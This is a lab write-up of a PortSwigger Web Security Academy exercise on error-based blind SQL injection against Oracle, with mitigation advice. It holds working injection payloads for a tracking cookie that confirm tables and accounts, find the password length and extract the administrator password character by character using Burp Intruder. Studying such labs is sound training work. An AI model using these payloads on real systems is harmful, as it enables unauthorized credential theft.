# Blind SQL Injection with Conditional Errors

| Property       | Value                            |
| -------------- | -------------------------------- |
| **Category**   | SQL Injection                    |
| **Difficulty** | Practitioner                     |
| **Platform**   | PortSwigger Web Security Academy |
| **Status**     | ✅ Completed                      |

---

## Skills Demonstrated

* Blind SQL Injection
* Error-Based Blind SQL Injection
* Oracle SQL
* Burp Suite Repeater
* Burp Suite Intruder
* Conditional Logic

---

# Overview

This lab demonstrates **Blind SQL Injection using conditional errors**. Instead of relying on differences in page content, the attacker deliberately causes database errors only when a specific condition evaluates to **TRUE**.

By observing whether an error occurs, sensitive information can be extracted one character at a time.

---

# Lab Objective

Exploit a Blind SQL Injection vulnerability by triggering conditional database errors to retrieve the administrator's password.

---

# Understanding the Vulnerability

Some applications return identical pages regardless of whether a SQL condition is TRUE or FALSE.

However, if an attacker can intentionally trigger a database error only when a condition is satisfied, the presence or absence of that error becomes a communication channel.

This technique is known as **Error-Based Blind SQL Injection**.

---

# Attack Methodology

1. Verify the existence of the `users` table.
2. Trigger conditional database errors.
3. Confirm the administrator account.
4. Determine the administrator password length.
5. Extract the password character by character.

---

# Solution Walkthrough

## Step 1 – Verify the `users` Table

Modify the `TrackingId` cookie:

```http
TrackingId=<TRACKING_ID>'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

**Observation**

No database error occurs, confirming that the `users` table exists.

---

## Step 2 – Trigger a Conditional Error

Use:

```http
TrackingId=<TRACKING_ID>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Observation**

A database error is returned because the condition evaluates to TRUE.

Now test:

```http
TrackingId=<TRACKING_ID>'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**Observation**

The error disappears, confirming that conditional errors can be used to infer TRUE/FALSE results.

---

## Step 3 – Verify the Administrator Account

Use:

```http
TrackingId=<TRACKING_ID>'||(SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
```

**Observation**

A database error confirms that the `administrator` account exists.

---

## Step 4 – Determine Password Length

Use:

```http
TrackingId=<TRACKING_ID>'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Send the request to **Burp Intruder**.

* Attack Type: **Sniper**
* Payload: Numeric values

**Observation**

The Intruder results reveal that the administrator password is **20 characters long**.

---

## Step 5 – Extract the Password

Use:

```http
TrackingId=<TRACKING_ID>'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Configure **Burp Intruder**:

* Attack Type: **Cluster Bomb**
* Payload Set 1: Position numbers (1–20)
* Payload Set 2: Characters (`a-z`, `0-9`)

Run the attack and identify the correct character for each position.

**Observation**

The administrator password is reconstructed character by character. The actual lab password has been replaced with `<ADMINISTRATOR_PASSWORD>` for documentation purposes.

---

# Payload Analysis

### `CASE WHEN`

Evaluates a condition and executes different expressions based on the result.

### `TO_CHAR(1/0)`

Intentionally triggers a divide-by-zero database error.

### `ROWNUM`

Oracle pseudo-column used to limit query results.

### `SUBSTR()`

Extracts one character from the administrator password.

---

# Why the Attack Works

The application suppresses query results but still exposes database errors.

By deliberately generating errors only when specific SQL conditions are TRUE, attackers can reconstruct sensitive information without directly viewing any database output.

---

# Detection Tips

Security testers can identify this vulnerability by:

* Testing conditional SQL expressions.
* Observing differences between successful responses and database errors.
* Looking for Oracle-specific functions such as `CASE WHEN` and `TO_CHAR`.
* Comparing TRUE and FALSE conditions.

---

# Common Mistakes

* Forgetting to restrict queries to a single row.
* Using database-specific syntax that does not match the target DBMS.
* Ignoring subtle database error messages.
* Attempting password extraction before determining the password length.

---

# Real-World Scenario

Some applications suppress all query output but accidentally expose database errors.

Attackers can exploit this behavior to leak sensitive information by intentionally triggering errors only when specific conditions are satisfied, allowing complete credential extraction without visible SQL results.

---

# Mitigation

Developers should:

* Use parameterized queries.
* Avoid concatenating user input into SQL statements.
* Suppress detailed database error messages.
* Validate user input on the server side.
* Regularly test applications for Blind SQL Injection.

---

# Key Takeaways

* Error-based Blind SQL Injection relies on database errors instead of visible query results.
* Oracle's `CASE WHEN` construct can be abused to generate conditional errors.
* Burp Intruder automates password extraction.
* Database errors should never be exposed to end users.

---

# References

* PortSwigger Web Security Academy
* OWASP SQL Injection Prevention Cheat Sheet
* Oracle Database Documentation

---

> **Disclaimer:** This write-up documents a PortSwigger Web Security Academy lab completed in an authorized training environment for educational purposes only.
